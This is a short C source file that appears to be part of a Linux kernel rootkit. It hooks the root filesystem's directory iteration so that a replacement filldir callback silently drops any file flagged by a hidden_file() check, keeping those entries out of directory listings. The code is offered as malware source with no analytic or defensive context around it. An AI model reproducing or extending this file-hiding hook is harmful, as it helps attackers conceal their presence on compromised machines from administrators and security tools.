#include <linux/fs.h>
#include <linux/string.h>

/* src/include */
#include "debug.h"
#include "filldir_proto.h"

/* hook */
#include "sym_map.h"

/* logic */
#include "hidden.h"

/* hooked */
#include "root_iterate.h"

/**
 *
 *
 */
static int (*filldir)(FILLDIR_PROTO);

/**
 *
 *
 */
static int _m_filldir(FILLDIR_PROTO)
{
        if (hidden_file(ino, name))
                return 0;

        return filldir(FILLDIR_ARGS);
}

int m_root_iterate(ITERATE_PROTO)
{
        int ret = 0;

        DEBUG("shini :: m_root_iterate, called!\n");
        filldir = FILLDIR_VAR;
        REPLACE_FILLDIR(sym_map.old->root_iterate, _m_filldir);
        return ret;
}

